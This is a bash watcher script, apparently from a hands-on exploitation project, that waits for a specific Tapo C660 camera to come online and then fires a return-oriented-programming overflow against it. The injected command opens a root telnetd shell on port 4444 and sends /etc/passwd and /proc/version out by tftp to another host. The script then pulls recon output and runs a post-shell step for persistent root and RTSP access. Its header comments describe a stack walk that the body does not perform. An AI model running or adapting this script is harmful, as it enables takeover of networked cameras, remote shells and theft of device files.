#!/bin/bash
# Wait for the C660 (MAC 50:3D:D1:2F:49:B9) to appear, then walk its main-stack region down.
#
# Presence is ARP **and** ICMP: the Eero proxy-answers ICMP for absent units, and an ARP entry
# alone is not presence on this fleet. Nothing is fired while the unit is absent; the walk stops
# on the first DEAD reply that survives the hang oracle, and the address survives restarts.
#
#   deliverables/scripts/c660_sweep_watch.sh &            # arms the watcher
#   cat /tmp/c660_sweep.phase /tmp/c660_sweep.addr        # phase word and next candidate
#   tail /tmp/c660_sweep.log                              # every step, one payload per cycle
#
# Phases: WAITING -> RUNNING -> (WAITING after a batch | DONE | EXHAUSTED).
# On DONE: `nc <ip> 4444`, `tapo_post.py <ip> --pull`, `find_chain.py <main>`.
#
# Three bugs in the previous inline watcher are fixed here:
#   * the MAC compare used `octet + 0` in awk, so `3d`/`d1`/`2f`/`b9` truncated to 3/0/2/0 and
#     the entry never matched — the watcher could never fire;
#   * nothing checked ICMP, so a stale ARP entry started a walk against a sleeping unit;
#   * the brute index persisted across batches while the watcher advanced the base, so the second
#     batch resumed past its own length and fired nothing (the index is reset per batch now).
set -u
MAC="${MAC:-50:3D:D1:2F:49:B9}"
HOST_OVERRIDE="${HOST:-}"
LOG="${LOG:-/tmp/c660_sweep.log}"
PHASE_FILE="${PHASE_FILE:-/tmp/c660_sweep.phase}"
ADDR_FILE="${ADDR_FILE:-/tmp/c660_sweep.addr}"
START="${START:-0xbef80000}"      # walked downwards: the C460 decode buffer sat at 0xbef8b000
END="${END:-0xbef00000}"
STEP="${STEP:-0x400}"
BATCH="${BATCH:-512}"
PC_OFFSET="${PC_OFFSET:-1060}"    # buffer -> saved pc, derived from the C660 /bin/main (0x424)
POLL="${POLL:-10}"
MAX_WAIT="${MAX_WAIT:-0}"         # seconds to wait for the unit; 0 = forever
HERE="$(cd "$(dirname "$0")" && pwd)"
HARNESS="${HARNESS:-$HERE/tapo_connectap_sc.py}"
ARP_CMD="${ARP_CMD:-sudo -n /usr/sbin/arp}"   # overridable for the self-test
PING_CMD="${PING_CMD:-ping}"
NC_CMD="${NC_CMD:-nc}"
GW="${GW:-192.168.4.1}"
ROUTE_CMD="${ROUTE_CMD:-sudo -n route add}"   # pre-fire route fix (§1), overridable for the test

log() { printf '%s %s\n' "$(date +%H:%M:%S)" "$*" | tee -a "$LOG"; }
phase() { echo "$1" >"$PHASE_FILE"; }
# One canonical form: lowercase hex, every octet zero-padded, separators stripped. Both sides go
# through it, so arp's unpadded print (`…:0:22:e3:2c` for 00:22) and a colonless MAC compare equal.
# The old `tolower($4) == want` only worked while every octet of the target MAC happened to be
# two digits — change the MAC to one with a low octet and the watcher silently never fires.
norm() {
  local f out=
  for f in $(echo "$1" | tr 'A-F' 'a-f' | tr ':-.' '   '); do
    out="$out$(printf '%2s' "$f" | tr ' ' 0)"
  done
  echo "$out"
}

lookup() {
  $ARP_CMD -an 2>/dev/null | awk '{ gsub(/[()]/, "", $2); print $2, $4 }' \
    | while read -r ip mac; do
        [ -n "$ip" ] || continue
        [ "$(norm "$mac")" = "$(norm "$MAC")" ] && { echo "$ip"; break; }
      done
}

present() {
  local ip="$1"
  [ -n "$ip" ] || return 1
  $PING_CMD -c 1 -W 800 "$ip" >/dev/null 2>&1
}

[ -s "$ADDR_FILE" ] && ADDR=$(cat "$ADDR_FILE") || ADDR=$START
armed=$(date +%s)
phase WAITING
log "watch armed for $MAC from $(printf 0x%x "$ADDR") down to $END, $STEP steps, batch $BATCH"

while :; do
  case "$(cat "$PHASE_FILE" 2>/dev/null)" in DONE|EXHAUSTED) break;; esac
  ip="${HOST_OVERRIDE:-$(lookup)}"
  if present "$ip"; then
    # a cold sudo timestamp would make every batch a silent no-op *and* advance the walk
    if ! sudo -n true 2>/dev/null; then
      log "sudo is not warm — waiting (walk position unchanged)"
      sleep "$POLL"
      continue
    fi
    phase RUNNING
    # en1 route fix (per-boot, re-asserted)
    $ROUTE_CMD -host "$ip" "$GW" >/dev/null 2>&1 || true
    # DS-READINESS GATE (OMP review / C460 lesson): fire only when the camera's login
    # succeeds — a pingable-but-sleeping camera has no main process to overflow.
    # wake + prove a real DS login (the plain cnonce-only POST never returns a stok on
    # this firmware; the apps wake a sleeping unit with a WoWLAN magic packet — so do we)
    if ! timeout 100 /opt/homebrew/bin/python3 "$HERE/../scripts/tapo_reach.py" "$ip" --wake-mac "$MAC" --tries 4 \
          > /tmp/c660_reach.log 2>&1; then
      log "DS not reachable at $ip — skipping fire, will retry"
      phase WAITING
      sleep "$POLL"
      continue
    fi
    log "DS ready at $ip — firing ROP (pop 0x24462 pivot 0x28514e system 0x15928, telnetd)"
    # C660 chain is non-PIE ROP from the offline BCL1 decode — fixed .text addresses,
    # no stack sweep. telnetd (not nc -e) so the listener survives past one connection.
    log "present at $ip — ROP fire (pop 0x24462 pivot 0x28514e system 0x15928, telnetd)"
    before=$(wc -l <"$LOG" 2>/dev/null || echo 0)
    sudo -n /opt/homebrew/bin/python3 "$HERE/tapo_connectap_rop.py" "$ip" \
      --offset 1060 --pop 0x24462 --pivot 0x28514e --system 0x15928 \
      --cmd '/bin/busybox telnetd -l /bin/sh -p 4444 & /bin/busybox tftp -p -l /etc/passwd 192.168.4.160 & /bin/busybox tftp -p -l /proc/version 192.168.4.160 &' >>"$LOG" 2>&1
    rc=$?
    sleep 5
    if timeout 6 bash -c "exec 3<>/dev/tcp/$ip/4444" 2>/dev/null; then
      mkdir -p "/tmp/pane1/$ip"
      (printf 'id\n'; sleep 2; printf 'cat /proc/mtd\n'; sleep 2; printf 'cat /proc/version\n'; sleep 2) | \
        timeout 12 nc "$ip" 4444 >"/tmp/pane1/$ip/recon_telnetd.txt" 2>/dev/null
      log "FOUND — telnetd up on $ip:4444, recon $(wc -c <"/tmp/pane1/$ip/recon_telnetd.txt" 2>/dev/null) bytes at /tmp/pane1/$ip/recon_telnetd.txt"
      # convert the shell immediately: repeatable ROP + RTSP (c660_postshell waits on :4444 itself)
      log "running postshell chain on $ip"
      sudo -n bash "$HERE/c660_postshell.sh" "$ip" >>"$LOG" 2>&1 \
        && log "postshell chain OK — repeatable root + RTSP provisioned" \
        || log "postshell chain FAILED (see $LOG lines above); telnetd still on $ip:4444 for manual retry"
      phase DONE
      exit 0
    fi
    # discriminating test: did system() actually run? probe login latency around the sleep
    sudo -n /opt/homebrew/bin/python3 "$HERE/rop_timing_probe.py" "$ip" >>"$LOG" 2>&1
    log "timing probe: $(cat /tmp/rop_timing.json 2>/dev/null || echo 'no-result')"
    log "ROP fired rc=$rc but 4444 not open — will retry on next presence"
    phase WAITING
    continue
  fi
  # MAX_WAIT bounds *absence* only: while the unit answers, batches may take as long as they take
  if [ "$MAX_WAIT" -gt 0 ] && [ $(( $(date +%s) - armed )) -ge "$MAX_WAIT" ]; then
    log "unit did not appear within ${MAX_WAIT}s — watcher exits, nothing fired"
    exit 2
  fi
  sleep "$POLL"
done
